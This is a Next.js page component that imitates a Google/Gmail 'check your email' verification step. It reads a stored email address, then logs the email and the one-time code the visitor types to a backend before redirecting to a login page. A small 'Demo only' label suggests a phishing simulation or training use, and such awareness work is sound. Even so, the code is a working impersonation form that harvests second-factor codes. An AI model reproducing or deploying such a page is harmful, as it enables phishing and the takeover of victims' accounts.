'use client';

import { useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';
import { apiClient } from '@/lib/api-client';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';

export default function DemoGoogleCodePage() {
  const router = useRouter();
  const [email, setEmail] = useState('');
  const [code, setCode] = useState('');
  const [error, setError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  useEffect(() => {
    if (typeof window !== 'undefined') {
      setEmail(sessionStorage.getItem('demo_google_email') || '');
    }
  }, []);

  const handleVerify = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    setIsSubmitting(true);

    try {
      await apiClient.logDemoGoogleAttempt({
        step: 'code',
        email: email.trim(),
        code: code.trim(),
      });
      router.push('/login');
    } catch (err: any) {
      setError(err?.message || 'Unable to continue');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#f8f9fa] text-slate-900">
      <div className="mx-auto flex min-h-screen max-w-md flex-col justify-center px-4">
        <div className="mb-6 text-center">
          <div className="mx-auto mb-3 flex h-12 w-12 items-center justify-center rounded-full border border-slate-200 bg-white text-lg font-semibold">
            G
          </div>
          <h1 className="text-2xl font-semibold">Check your email</h1>
          <p className="text-sm text-slate-500">Enter the code sent to your Gmail inbox.</p>
        </div>

        <Card className="border-slate-200 shadow-sm">
          <CardHeader>
            <CardTitle className="text-base">Demo verification</CardTitle>
            <CardDescription className="text-xs text-slate-500">
              Demo only. Use any code to continue.
            </CardDescription>
          </CardHeader>
          <CardContent>
            {error && (
              <div className="mb-4 rounded-md border border-red-200 bg-red-50 px-3 py-2 text-xs text-red-700">
                {error}
              </div>
            )}
            <form onSubmit={handleVerify} className="space-y-4">
              <div className="space-y-2">
                <Label htmlFor="demo-google-email" className="text-xs uppercase tracking-wide text-slate-500">
                  Email
                </Label>
                <Input
                  id="demo-google-email"
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  required
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="demo-google-code" className="text-xs uppercase tracking-wide text-slate-500">
                  Verification code
                </Label>
                <Input
                  id="demo-google-code"
                  type="text"
                  placeholder="123456"
                  value={code}
                  onChange={(e) => setCode(e.target.value)}
                  required
                />
              </div>
              <Button type="submit" className="w-full" disabled={isSubmitting}>
                {isSubmitting ? 'Verifying...' : 'Verify'}
              </Button>
            </form>
          </CardContent>
        </Card>

        <p className="mt-6 text-center text-xs text-slate-500">
          You will be redirected to the login page after verification.
        </p>
      </div>
    </div>
  );
}
